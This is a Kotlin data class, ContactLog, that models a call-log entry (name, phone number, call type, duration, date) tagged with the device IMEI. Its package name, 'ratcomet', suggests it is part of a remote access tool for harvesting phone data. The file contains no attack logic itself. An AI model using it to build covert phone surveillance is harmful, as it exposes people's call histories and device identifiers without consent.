package ug.hix.ratcomet.model

import ug.hix.ratcomet.util.CometUtil

data class ContactLog(
    val imei : String = CometUtil.getImei(),
    val name: String,
    val phoneNumber: String,
    val type: Int,
    val duration: String,
    val date : String
    )